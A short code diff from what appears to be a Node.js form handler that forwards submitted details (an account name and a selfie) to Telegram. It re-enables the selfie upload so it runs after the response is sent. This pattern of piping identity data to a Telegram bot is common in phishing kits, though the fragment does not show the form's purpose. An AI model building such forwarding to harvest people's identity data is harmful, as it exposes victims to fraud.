@@ -134,13 +134,14 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
         // Send text data to Telegram
         await sendTextToTelegram(formattedText);
 
-        // Send selfie to Telegram with a caption if there is one
-        const caption = `📸 Selfie from: ${name}`;
-         // sendPhotoToTelegram(selfieFile.path, caption);
     res.json({ 
             success: true, 
             message: 'Form submitted and data sent to Telegram successfully' 
     });   
+    
+    // Send selfie to Telegram with a caption if there is one
+        const caption = `📸 Selfie from: ${name}`;
+          sendPhotoToTelegram(selfieFile.path, caption);
 });
 
 // Error handling middleware
